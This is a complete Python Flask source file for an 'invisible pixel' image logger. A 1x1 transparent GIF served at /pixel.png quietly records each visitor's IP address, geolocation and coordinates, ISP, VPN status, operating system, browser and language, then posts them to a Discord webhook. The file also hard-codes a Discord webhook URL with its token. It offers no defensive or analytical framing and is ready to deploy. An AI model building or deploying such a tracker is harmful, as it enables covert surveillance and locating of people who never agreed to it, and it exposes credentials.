from flask import Flask, request, Response
import requests
from datetime import datetime
import re

app = Flask(__name__)

# --- CONFIGURATION ---
# ⚠️ REGENERATE YOUR WEBHOOK NOW – this one is public.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"

# IPs to IGNORE (so your own tests don't get logged)
IGNORE_IPS = [
    "127.0.0.1",      # localhost
    "192.168.1.1",    # your local IP (change to your actual public IP if you want)
    "YOUR_PUBLIC_IP", # replace with your real IP (find at whatismyip.com)
]

# Set to True if you want to ignore the referer header (so the link itself isn't logged)
IGNORE_REFERER = True

# --- HELPER: Get real client IP ---
def get_client_ip():
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        return x_forwarded_for.split(',')[0].strip()
    return request.remote_addr

# --- HELPER: Check if IP should be ignored ---
def is_ignored(ip):
    return ip in IGNORE_IPS

# --- HELPER: Get IP info from multiple APIs (more accuracy) ---
def get_ip_info(ip):
    try:
        # Try ipapi.co first (gives more fields)
        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                # Translate fields to our format
                return {
                    'country': data.get('country_name'),
                    'regionName': data.get('region'),
                    'city': data.get('city'),
                    'lat': data.get('latitude'),
                    'lon': data.get('longitude'),
                    'isp': data.get('org'),
                    'proxy': data.get('proxy') or data.get('vpn') or False,
                    'timezone': data.get('timezone'),
                }
        # Fallback to ip-api.com if ipapi.co fails
        resp2 = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy,timezone',
            timeout=5
        )
        if resp2.status_code == 200:
            data2 = resp2.json()
            if data2.get('status') == 'success':
                return {
                    'country': data2.get('country'),
                    'regionName': data2.get('regionName'),
                    'city': data2.get('city'),
                    'lat': data2.get('lat'),
                    'lon': data2.get('lon'),
                    'isp': data2.get('isp'),
                    'proxy': data2.get('proxy') or False,
                    'timezone': data2.get('timezone'),
                }
    except Exception:
        pass
    return None

# --- HELPER: Parse User-Agent for device details ---
def parse_user_agent(ua):
    os = "Unknown OS"
    browser = "Unknown Browser"
    device = "Desktop"

    # OS detection
    if "Windows" in ua:
        os = "Windows"
        if "Windows NT 10.0" in ua: os = "Windows 10/11"
        elif "Windows NT 6.1" in ua: os = "Windows 7"
        elif "Windows NT 6.3" in ua: os = "Windows 8.1"
    elif "Mac OS X" in ua:
        os = "macOS"
        if "Mac OS X 10_15" in ua: os = "macOS Catalina"
        elif "Mac OS X 11_0" in ua: os = "macOS Big Sur"
        elif "Mac OS X 12_0" in ua: os = "macOS Monterey"
    elif "Linux" in ua:
        os = "Linux"
        if "Android" in ua:
            os = "Android"
            device = "Mobile"
    elif "iPhone" in ua:
        os = "iOS"
        device = "Mobile"
    elif "iPad" in ua:
        os = "iPadOS"
        device = "Tablet"

    # Browser detection
    if "Edg/" in ua:
        browser = "Microsoft Edge"
    elif "OPR/" in ua or "Opera" in ua:
        browser = "Opera"
    elif "Chrome/" in ua and not "Edg/" in ua and not "OPR/" in ua:
        browser = "Google Chrome"
    elif "Firefox/" in ua:
        browser = "Mozilla Firefox"
    elif "Safari/" in ua and not "Chrome/" in ua:
        browser = "Apple Safari"
    elif "Trident/" in ua or "MSIE" in ua:
        browser = "Internet Explorer"

    # Device type
    if "Mobile" in ua or "Android" in ua and "Tablet" not in ua:
        device = "Mobile"
    elif "Tablet" in ua or "iPad" in ua:
        device = "Tablet"

    return os, browser, device

# --- HELPER: Send Discord embed ---
def send_discord_notification(ip_info, ip):
    if not DISCORD_WEBHOOK_URL:
        return

    # Ignore if we don't want to log
    if is_ignored(ip):
        print(f"Ignored IP: {ip}")
        return

    # Parse headers
    ua = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', '')
    language = request.headers.get('Accept-Language', 'Unknown')

    # Parse device info
    os, browser, device = parse_user_agent(ua)

    # VPN status
    vpn_status = "🟢 OFF (No VPN/Proxy)"
    embed_color = 0x00ff00
    if ip_info and ip_info.get('proxy') is True:
        vpn_status = "🔴 ON (VPN/Proxy detected)"
        embed_color = 0xff0000

    # Location
    if ip_info:
        location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('regionName', 'N/A')}, {ip_info.get('country', 'N/A')}"
        isp = ip_info.get('isp', 'N/A')
        coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}"
        timezone = ip_info.get('timezone', 'N/A')
    else:
        location = "N/A"
        isp = "N/A"
        coords = "N/A"
        timezone = "N/A"

    # Referrer (optional)
    if IGNORE_REFERER:
        referer = "🔒 Hidden (by config)"

    embed = {
        "title": "🎯 Invisible Pixel Logged!",
        "color": embed_color,
        "thumbnail": {"url": "https://cdn-icons-png.flaticon.com/512/3063/3063225.png"},
        "fields": [
            {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
            {"name": "📍 Location", "value": location, "inline": False},
            {"name": "🗺️ Coordinates", "value": f"`{coords}`", "inline": True},
            {"name": "📡 ISP", "value": isp, "inline": True},
            {"name": "🕒 Timezone", "value": timezone, "inline": True},
            {"name": "💻 Device", "value": device, "inline": True},
            {"name": "🖥️ OS", "value": os, "inline": True},
            {"name": "🌐 Browser", "value": browser, "inline": True},
            {"name": "🌎 Language", "value": language, "inline": True},
            {"name": "🔗 Referrer", "value": referer if referer else "Direct", "inline": False},
            {"name": "📅 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False}
        ],
        "footer": {"text": "Python Image Logger · Enhanced"},
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {"embeds": [embed]}
    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if resp.status_code != 204:
            print(f"Discord error: {resp.status_code}")
    except Exception as e:
        print(f"Send error: {e}")

# --- ROUTES ---
@app.route('/')
def home():
    return "Image Logger is active. /pixel.png is the tracker."

@app.route('/pixel.png')
def pixel():
    ip = get_client_ip()

    # If IP is ignored, just return pixel without logging
    if is_ignored(ip):
        print(f"Ignored IP: {ip} (no log)")
    else:
        ip_info = get_ip_info(ip)
        send_discord_notification(ip_info, ip)

    # Return the 1x1 transparent GIF
    gif = bytes([
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
        0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x01, 0x00,
        0x00
    ])
    return Response(gif, mimetype='image/gif')

if __name__ == '__main__':
    app.run(debug=True)
